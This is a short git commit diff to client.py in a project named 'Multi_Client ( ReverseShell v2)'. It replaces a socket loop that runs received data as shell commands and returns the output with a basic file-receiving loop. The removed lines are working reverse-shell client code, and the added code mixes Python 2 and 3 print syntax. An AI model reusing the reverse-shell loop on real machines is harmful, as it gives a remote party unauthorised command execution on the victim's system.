c119de066781a42d81ed972c8af0c01ddd8e7274
nouarnoorelhouda <nouarnoorelhouda@gmail.com>
2020-04-29 16:42:45 +0200

    Update client.py

--- Multi_Client ( ReverseShell v2)/client.py
+++ Multi_Client ( ReverseShell v2)/client.py
@@ -8,16 +8,16 @@ port = 9999
 
 s.connect((host, port))
 
-while True:
-    data = s.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
+with open('received_file', 'wb') as f:
+    print 'file opened'
+    while True:
+        print('receiving data...')
+        data = s.recv(1024)
+        print('data=%s', (data))
+        if not data:
+            break
+        # write data to a file
+        f.write(data)
 
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
-
-        print(output_str)
+f.close()
+print('Successfully get the file')
